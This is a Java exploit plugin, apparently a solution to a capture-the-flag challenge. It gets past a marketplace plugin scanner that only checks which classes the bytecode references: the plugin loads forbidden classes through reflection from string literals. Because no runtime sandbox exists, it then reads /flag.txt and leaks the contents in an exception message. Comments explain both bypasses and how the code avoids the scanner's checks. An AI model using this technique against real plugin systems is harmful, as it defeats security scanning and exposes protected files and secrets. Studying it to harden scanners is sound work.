// b2bee exploit plugin — passes PluginScanner's static scan AND runs unconfined
// (SandboxPolicy is only a static checker; nothing installs a SecurityManager).
//
// Two bypasses:
//   A) Scanner only inspects bytecode OWNERS/OPERANDS + rejects invokedynamic & dynamic consts.
//      String LDC *content* is never inspected -> reach forbidden classes via reflection, where
//      the only bytecode owners are java/lang/Class + java/lang/reflect/* (all whitelisted).
//   B) No real sandbox at runtime -> reflected FileInputStream("/flag.txt") just works.
//
// HARD CONSTRAINT: no `+` string concat and no lambdas/method-refs (both compile to
// invokedynamic, which the scanner rejects). Use string literals + StringBuilder only.
// Compile: javac -XDstringConcat=inline HoneyBadger.java   (adapt SPI names to the real api pkg)

package ru.avitoctf.marketplugins.plugin;

import ru.avitoctf.marketplugins.api.DiscountPlugin;   // whitelisted package
import ru.avitoctf.marketplugins.model.Cart;           // whitelisted package
import java.lang.reflect.Constructor;                  // java/lang/reflect/* -> ALLOWED
import java.lang.reflect.Method;                        // java/lang/reflect/* -> ALLOWED
import java.math.BigDecimal;                            // java/math -> ALLOWED

public class HoneyBadger implements DiscountPlugin {
    @Override
    public BigDecimal apply(Cart cart) {                // adapt to the real SPI method signature
        throw new RuntimeException(readFlag());         // surface the flag via the error text
    }

    private static String readFlag() {
        try {
            Class<?> fis    = Class.forName("java.io.FileInputStream"); // owner java/lang/Class  OK
            Constructor<?> c = fis.getConstructor(String.class);        // owner java/lang/Class  OK
            Object stream   = c.newInstance("/flag.txt");               // owner Constructor      OK
            Method readAll  = fis.getMethod("readAllBytes");            // owner java/lang/Class  OK (JDK9+)
            byte[] data     = (byte[]) readAll.invoke(stream);          // owner Method; cast [B  OK
            return new String(data);                                    // owner java/lang/String OK
        } catch (Throwable t) {
            return String.valueOf(t);
        }
    }
}
